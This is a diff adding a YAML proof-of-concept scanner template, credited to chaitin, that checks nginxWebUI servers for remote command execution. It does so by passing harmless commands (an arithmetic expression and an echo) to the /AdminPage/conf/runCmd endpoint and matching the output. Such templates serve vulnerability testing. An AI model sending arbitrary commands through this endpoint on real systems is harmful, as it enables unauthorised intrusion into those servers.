@@ -1,0 +1,30 @@
+name: poc-yaml-nginxwebui-rce
+transport: http
+set:
+  s1: randomInt(100000000, 200000000)
+  s2: randomInt(10000, 20000)
+  s3: string("nginx_") + randomLowercase(5)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /AdminPage/conf/runCmd?cmd=expr%20{{s1}}%20-%20{{s2}}%26%26echo%20nginx
+      follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2))) && response.body_string.contains("运行失败") && response.content_type.contains("application/json")
+  r1:
+    request:
+      method: GET
+      path: /AdminPage/conf/runCmd?cmd=echo%20{{s3}}
+      follow_redirects: false
+    expression: response.status == 200 && response.body_string.contains(s3) && response.body_string.contains("运行成功") && response.content_type.contains("application/json")
+  r2:
+    request:
+      method: GET
+      path: /aDminPage/about
+      follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(b"<title>nginxWebUI</title>") && response.content_type.contains("text/html")
+expression: r0() || r1() || r2()
+detail:
+  author: chaitin
+  links:
+    - https://stack.chaitin.com/techblog/detail?id=118
